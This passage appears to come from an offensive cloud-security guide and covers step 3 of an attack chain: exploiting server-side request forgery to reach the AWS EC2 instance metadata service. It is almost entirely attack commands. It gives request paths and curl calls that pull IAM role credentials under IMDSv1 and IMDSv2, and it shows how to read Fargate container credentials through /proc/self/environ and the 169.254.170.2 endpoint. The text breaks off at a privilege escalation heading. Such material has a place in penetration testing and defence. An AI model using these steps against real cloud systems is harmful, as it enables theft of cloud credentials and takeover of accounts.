# Step 3: Metadata SSRF (EC2)

Exploit SSRF to access metadata endpoint (IMDSv1):

```bash
# Access metadata endpoint
http://169.254.169.254/latest/meta-data/

# Get IAM role name
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Extract temporary credentials
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME

# Response contains:
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2019-08-01T05:20:30Z"
}
```

**For IMDSv2 (token required):**

```bash
# Get token first
TOKEN=$(curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" \
  "http://169.254.169.254/latest/api/token")

# Use token for requests
curl -H "X-aws-ec2-metadata-token:$TOKEN" \
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

**Fargate Container Credentials:**

```bash
# Read environment for credential path
/proc/self/environ
# Look for: AWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/...

# Access credentials
http://169.254.170.2/v2/credentials/CREDENTIAL-PATH
```

---

## Privilege Escalation Techniques